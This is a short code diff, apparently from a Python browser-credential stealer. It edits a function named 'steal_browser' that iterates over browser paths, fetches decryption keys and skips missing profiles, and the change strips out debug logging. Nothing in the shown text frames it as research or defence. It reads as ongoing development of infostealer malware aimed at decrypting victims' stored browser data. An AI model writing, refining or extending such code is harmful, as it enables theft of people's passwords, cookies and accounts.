@@ -173,21 +173,6 @@ def decrypt(buff, key):
 
 def steal_browser():
     for name, path in BROWSERS.items():
-        log_path = os.path.join(EXTRACT_FOLDER, "steal_browser_log.txt")
-        with open(log_path, "a", encoding="utf-8") as log:
-            log.write(f"--- Checking {name} ---\n")
-        
-        if not os.path.exists(path):
-            with open(log_path, "a", encoding="utf-8") as log:
-                log.write(f"Path not found: {path}\n")
-            continue
-        
-        key = get_key(path)
-        if not key:
-            with open(log_path, "a", encoding="utf-8") as log:
-                log.write(f"Failed to get decryption key for: {path}\n")
-            continue
-
         if not os.path.exists(path): continue
         key = get_key(path)
         if not key: continue
